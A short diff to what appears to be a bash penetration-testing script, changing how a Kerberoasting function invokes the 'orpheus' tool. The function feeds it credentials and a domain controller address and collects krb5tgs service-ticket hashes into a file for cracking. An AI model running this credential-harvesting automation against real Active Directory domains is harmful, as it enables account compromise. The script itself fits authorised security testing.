@@ -3215,7 +3215,7 @@ kerborpheus_attack() {
             (
                 echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                 cat /dev/tty
-            ) | /usr/bin/script -qc "${python3} ${orpheus}" /dev/null | tee -a "${Kerberos_dir}/orpheus_output_${dc_domain}.txt"
+            ) | script -qc "${python3} ${orpheus}" /dev/null | tee -a "${Kerberos_dir}/orpheus_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             if grep -q "krb5tgs" "${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt"; then
                 hash_count=$(wc -l < "${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt")
